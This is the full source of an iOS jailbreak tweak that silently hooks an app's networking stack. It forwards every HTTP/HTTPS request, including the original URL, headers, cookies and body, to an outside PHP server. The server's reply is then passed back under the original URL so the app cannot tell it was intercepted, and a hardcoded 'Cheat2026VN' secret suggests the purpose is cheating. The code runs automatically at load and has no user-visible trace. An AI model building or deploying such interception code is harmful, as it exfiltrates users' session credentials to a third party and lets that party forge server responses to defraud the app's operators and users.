// ProxyTweak.xm  —  v1
// Silent production tweak — no menu, no icon.
// Every HTTP/HTTPS request the app makes is transparently forwarded to
// the proxy server at kProxyEndpoint, which decides what response to return.
// The original URL, method, headers, and body are all passed along so the
// server can replicate or override the real call.

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

// ── Config ────────────────────────────────────────────────────
static NSString *const kProxyEndpoint = @"https://chillysilly.frfrnocap.men/iosvz.php";
static NSString *const kProxyDoneKey  = @"_ProxyDone_";
// A shared secret so the PHP knows the request is from the tweak, not a random browser.
static NSString *const kProxySecret   = @"Cheat2026VN";

// ═══════════════════════════════════════════════════════════════
// MARK: - ProxyURLProtocol
// ═══════════════════════════════════════════════════════════════

@interface ProxyURLProtocol : NSURLProtocol
@property (nonatomic, strong) NSURLSessionDataTask *activeTask;
@end

@implementation ProxyURLProtocol

// ─── Eligibility ─────────────────────────────────────────────
+ (BOOL)canInitWithRequest:(NSURLRequest *)req {
    // Already tagged → skip to avoid infinite loop
    if ([NSURLProtocol propertyForKey:kProxyDoneKey inRequest:req]) return NO;
    NSString *scheme = req.URL.scheme.lowercaseString;
    // Only intercept HTTP/HTTPS
    if (![scheme isEqualToString:@"http"] && ![scheme isEqualToString:@"https"]) return NO;
    // Never intercept calls already going to the proxy itself
    NSString *host = req.URL.host.lowercaseString;
    if ([host isEqualToString:@"chillysilly.frfrnocap.men"]) return NO;
    return YES;
}

+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)r { return r; }

// ─── Intercept & forward ──────────────────────────────────────
- (void)startLoading {
    NSURL *proxyURL = [NSURL URLWithString:kProxyEndpoint];
    NSMutableURLRequest *proxyReq =
        [NSMutableURLRequest requestWithURL:proxyURL
                                cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                            timeoutInterval:30.0];
    proxyReq.HTTPMethod = @"POST";

    // ── Identity & auth ───────────────────────────────────────
    [proxyReq setValue:kProxySecret                      forHTTPHeaderField:@"X-Proxy-Secret"];
    [proxyReq setValue:self.request.URL.absoluteString   forHTTPHeaderField:@"X-Original-URL"];
    [proxyReq setValue:(self.request.HTTPMethod ?: @"GET") forHTTPHeaderField:@"X-Original-Method"];

    // ── Forward original headers (prefixed so PHP can extract) ─
    [self.request.allHTTPHeaderFields enumerateKeysAndObjectsUsingBlock:
        ^(NSString *k, NSString *v, BOOL *stop) {
            NSString *fwd = [NSString stringWithFormat:@"X-Fwd-%@", k];
            [proxyReq setValue:v forHTTPHeaderField:fwd];
        }
    ];

    // ── Forward body (drain stream if needed) ─────────────────
    NSData *body = self.request.HTTPBody;
    if (!body && self.request.HTTPBodyStream) {
        NSInputStream *stream = self.request.HTTPBodyStream;
        NSMutableData *buf    = [NSMutableData data];
        [stream open];
        uint8_t tmp[4096]; NSInteger n;
        while ((n = [stream read:tmp maxLength:sizeof(tmp)]) > 0)
            [buf appendBytes:tmp length:(NSUInteger)n];
        [stream close];
        body = [buf copy];
    }
    if (body.length) {
        proxyReq.HTTPBody = body;
        [proxyReq setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
        [proxyReq setValue:[NSString stringWithFormat:@"%lu", (unsigned long)body.length]
          forHTTPHeaderField:@"Content-Length"];
    }

    // ── Mark so nested calls don't re-intercept ───────────────
    [NSURLProtocol setProperty:@YES forKey:kProxyDoneKey inRequest:proxyReq];

    // ── Fire the forwarded request ────────────────────────────
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    cfg.protocolClasses = @[];  // bare session — no custom protocols
    NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];

    __weak typeof(self) weakSelf = self;
    self.activeTask = [session dataTaskWithRequest:proxyReq
                               completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;

        if (err || !resp) {
            NSError *fallback = err ?: [NSError errorWithDomain:NSURLErrorDomain
                                                           code:NSURLErrorCannotConnectToHost
                                                       userInfo:nil];
            [self.client URLProtocol:self didFailWithError:fallback];
            return;
        }

        // Rebuild the response with the original URL so the app doesn't notice the detour
        NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)resp;

        // Strip hop-by-hop headers the server may have added
        NSMutableDictionary *headers = [httpResp.allHeaderFields mutableCopy];
        for (NSString *hop in @[@"Transfer-Encoding", @"Connection", @"Keep-Alive",
                                 @"Proxy-Authenticate", @"Proxy-Authorization",
                                 @"TE", @"Trailers", @"Upgrade"])
            [headers removeObjectForKey:hop];

        NSHTTPURLResponse *fakeResp = [[NSHTTPURLResponse alloc]
            initWithURL:self.request.URL
             statusCode:httpResp.statusCode
            HTTPVersion:@"HTTP/1.1"
           headerFields:headers];

        [self.client URLProtocol:self didReceiveResponse:fakeResp
              cacheStoragePolicy:NSURLCacheStorageNotAllowed];
        if (data.length) [self.client URLProtocol:self didLoadData:data];
        [self.client URLProtocolDidFinishLoading:self];
    }];
    [self.activeTask resume];
}

- (void)stopLoading {
    [self.activeTask cancel];
    self.activeTask = nil;
}

@end

// ═══════════════════════════════════════════════════════════════
// MARK: - Bootstrap (inject into every session)
// ═══════════════════════════════════════════════════════════════

static void RegisterProxy(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        [NSURLProtocol registerClass:[ProxyURLProtocol class]];
    });
}

__attribute__((constructor(100))) static void init_proxy(void) {
    RegisterProxy();
}

// Patch every session configuration so the protocol is always first in line
%hook NSURLSessionConfiguration
- (NSArray *)protocolClasses {
    NSArray *orig = %orig;
    NSMutableArray *arr = [NSMutableArray arrayWithObject:[ProxyURLProtocol class]];
    if (orig) for (id cls in orig)
        if (cls != [ProxyURLProtocol class]) [arr addObject:cls];
    return [arr copy];
}
%end

// Make sure shared session and ad-hoc tasks also go through registration
%hook NSURLSession
+ (NSURLSession *)sharedSession                                           { RegisterProxy(); return %orig; }
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)r           { RegisterProxy(); return %orig; }
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)r
                           completionHandler:(void(^)(NSData*,NSURLResponse*,NSError*))c
                                                                          { RegisterProxy(); return %orig; }
- (NSURLSessionDataTask *)dataTaskWithURL:(NSURL *)u                      { RegisterProxy(); return %orig; }
- (NSURLSessionDataTask *)dataTaskWithURL:(NSURL *)u
                        completionHandler:(void(^)(NSData*,NSURLResponse*,NSError*))c
                                                                          { RegisterProxy(); return %orig; }
%end

%hook NSURLConnection
+ (instancetype)connectionWithRequest:(NSURLRequest *)r delegate:(id)d   { RegisterProxy(); return %orig; }
- (instancetype)initWithRequest:(NSURLRequest *)r delegate:(id)d          { RegisterProxy(); return %orig; }
%end

%ctor { RegisterProxy(); }
